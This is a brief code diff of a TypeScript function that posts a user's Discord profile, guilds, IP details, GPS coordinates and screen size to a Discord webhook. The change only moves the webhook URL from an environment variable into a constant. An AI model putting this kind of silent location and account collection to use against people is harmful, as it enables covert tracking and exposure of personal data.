@@ -1,3 +1,4 @@
+import { DISCORD_WEBHOOK } from "@/lib/constants";
 import {
   DiscordUser,
   DiscordGuild,
@@ -5,7 +6,7 @@ import {
   IpInfo,
   GpsData,
   ScreenSize,
-} from "../types/userdata";
+} from "@/lib/types/userdata";
 
 export const sendWebhook = async (
   userInfo: DiscordUser,
@@ -18,8 +19,6 @@ export const sendWebhook = async (
   screenSize: ScreenSize
 ) => {
   try {
-    const webhookUrl = process.env.DISCORD_WEBHOOK || "";
-
     const fields = [
       {
         name: "👤User",
@@ -77,7 +76,7 @@ export const sendWebhook = async (
       timestamp: new Date().toISOString(),
     };
 
-    const response = await fetch(webhookUrl, {
+    const response = await fetch(DISCORD_WEBHOOK || "", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
